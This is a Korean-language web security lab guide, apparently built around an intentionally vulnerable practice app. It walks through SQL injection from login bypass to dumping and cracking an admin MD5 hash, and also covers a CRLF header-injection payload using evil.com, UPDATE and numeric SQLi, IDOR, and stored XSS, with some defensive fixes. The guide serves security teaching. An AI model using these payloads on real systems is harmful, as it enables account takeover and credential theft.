실습 목표: SQL Injection의 완전한 공격 체인을 단계별로 수행합니다. 아무 정보 없는 상태에서 DB 구조를 파악하고, 비밀번호 해시를 탈취하여 복호화까지 완성합니다.
참고: PortSwigger SQL Injection Academy | OWASP SQLi

STEP 1 — 기본 로그인 우회 (Authentication Bypass)
→ Auth Bypass란?
입력: 로그인 페이지 아이디에 입력 (비밀번호는 무엇이든):
admin' OR 1=1 -- 실제 실행 쿼리 (Telemetry 콘솔에서 확인): SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = '...' ↑ 항상 참 ↑ 주석 처리됨 결과: WHERE 조건이 항상 참 → 첫 번째 유저(admin)로 로그인 성공!
STEP 2 — 컬럼 수 파악 (ORDER BY / UNION 준비)
→ UNION Based 공격이란?
UNION SELECT를 쓰려면 원본 쿼리의 컬럼 수가 같아야 합니다. ORDER BY로 컬럼 수를 파악합니다:
admin' ORDER BY 1--   → 성공 (1컬럼 이상 존재) admin' ORDER BY 2--   → 성공 (2컬럼 이상 존재) admin' ORDER BY 3--   → 성공 (3컬럼 이상 존재) admin' ORDER BY 4--   → 에러! → 컬럼 수 = 3개 확정 결론: 이 쿼리는 id, username, role 총 3개 컬럼을 반환합니다.
STEP 3 — 테이블 목록 열거 (sqlite_master 활용)
→ DB 스키마 열거란?
SQLite의 시스템 테이블 sqlite_master에는 모든 테이블/인덱스 정보가 있습니다:
fake' UNION SELECT 1, group_concat(name), 3 FROM sqlite_master WHERE type='table'-- → 로그인 후 상단 환영 문구에 DB 테이블 목록이 출력됩니다: 예시 결과: users,posts,sessions (콤마 구분) 결론: users 테이블이 존재함을 확인!
STEP 4 — 컬럼 이름 열거 (users 테이블 구조 파악)
SQLite에서는 PRAGMA table_info(테이블명)으로 컬럼목록을 얻을 수 있습니다:
fake' UNION SELECT 1, group_concat(name), 3 FROM pragma_table_info('users')-- 예시 결과: id,username,password,role 결론: users 테이블에 password 컬럼이 존재함 확인!
STEP 5 — 관리자 MD5 해시 탈취 (UNION 데이터 추출)
이제 테이블 이름(users)과 컬럼 이름(password)을 파악했으니 실제 데이터를 추출합니다:
fake_user' UNION SELECT 1, password, 3 FROM users WHERE username='admin'-- → 로그인 성공 후, 상단 환영 문구에 관리자의 MD5 해시가 출력됩니다: 0192023a7bbd73250516f069df18b500 원리: UNION이 원본 쿼리의 username 자리(2번째 컬럼)에 password 값을 채워넣어 세션 display_name으로 반영됩니다.
STEP 6 — 해시 크래킹 (레인보우 테이블 공격)
→ CrackStation (레인보우 테이블 사이트) 방문
Step 6-1: 탈취한 32자리 해시를 복사합니다: 0192023a7bbd73250516f069df18b500
Step 6-2: CrackStation의 입력창에 붙여넣고 [Crack Hashes] 클릭
Step 6-3: 결과: md5 → admin123 (평문 비밀번호 탈취 완료!)

💡 왜 MD5가 위험한가? MD5는 1초에 수십억 번 계산 가능한 빠른 해시입니다. 레인보우 테이블에 미리 계산된 해시가 있으면 즉시 역산됩니다. 실제 서비스는 bcrypt / Argon2 같은 느린 KDF를 사용해야 합니다.

PortSwigger: Header Injection

개념 예시 코드 (취약): @app.route('/redirect') def redir(): url = request.args.get('url') resp = Response(status=302) resp.headers['Location'] = url # ← 입력 미검증 return resp 공격 페이로드 URL: /redirect?url=http://evil.com%0d%0aSet-Cookie:%20session=hacked 결과: 브라우저는 Location: http://evil.com과 Set-Cookie: session=hacked 두 개의 헤더를 수신 → 세션 쿠키 강제 설정.

실습 목표: 마이페이지 정보 수정 쿼리에 SQLi를 주입해 다른 사용자의 비밀번호를 강제 변경합니다.
PortSwigger: SQLi in UPDATE

📌 취약 코드 패턴 예시
// id를 폼 숨김 필드로 전달받아 쿼리에 직접 삽입 query = "update members set name='" + name + "', email='" + email + "' where id='" + id + "'"; // ← id도 미검증!
이 앱에서 재현: Step 1: 암호 변경 페이지 URL 파라미터로 테스트합니다.
Step 2: 속임수 hidden 필드나 URL에 `id` 값을 변조:
id=alice' WHERE username='admin'-- Step 3: UPDATE가 다른 사람의 row에 적용됩니다! WHERE 절이 주입값으로 변경 되었기 때문입니다.
💡 원리: UPDATE SET col=val WHERE id='victim' WHERE user='admin'--'

실습 목표: 게시글 번호(idx) 파라미터가 숫자 타입에도 불구하고 SQLi/IDOR에 취약한 패턴을 분석합니다.
PortSwigger: IDOR

📌 취약 코드 패턴 예시
query = "select * from insecure_board where idx=" + idx; // idx를 따옴표 없이 그대로 삽입 → 숫자형 SQLi 가능! // 권한 체크 없음 → 비밀 게시글(secret='y')도 그냥 조회
IDOR 공격: 이 앱에서는 /post/1, /post/2 처럼 숫자를 직접 변경해 다른 사람 게시글을 조회할 수 있습니다.

숫자형 SQLi: 따옴표가 없는 숫자 컨텍스트에서는 다음 페이로드를 씁니다:
GET /post/1 UNION SELECT 1,username,password,4,5 FROM users-- 💡 문자형 vs 숫자형: WHERE id=''입력'' vs WHERE idx=입력 — 숫자형은 따옴표 없이 바로 연산됩니다.

실습 목표: 게시글 content 필드에 XSS 페이로드를 저장하면, 다른 사람이 읽을 때마다 Javascript가 실행됩니다.

1. 내 게시판 글의 수정 페이지로 진입 (예: boardUpdate.jsp?idx=5)
2. URL 파라미터를 타인의 글 번호로 변조 (예: boardUpdate.jsp?idx=1)
3. 서버 검증이 없으므로 남의 글이 수정 폼에 열림
4. 내용 수정 후 "Update" 버튼을 누르면 타인의 글 내용이 덮어씌워짐!
방어 예시:
query = "update insecure_board set title=?, content=? where idx=? AND id=?"; // AND id=? 추가!

실습 목표: 마이페이지처럼 세션 정보만으로 충분한 기능에서, 서버가 불필요하게 클라이언트의 파라미터를 신뢰하여 타인의 정보를 노출하는 설계를 분석합니다.
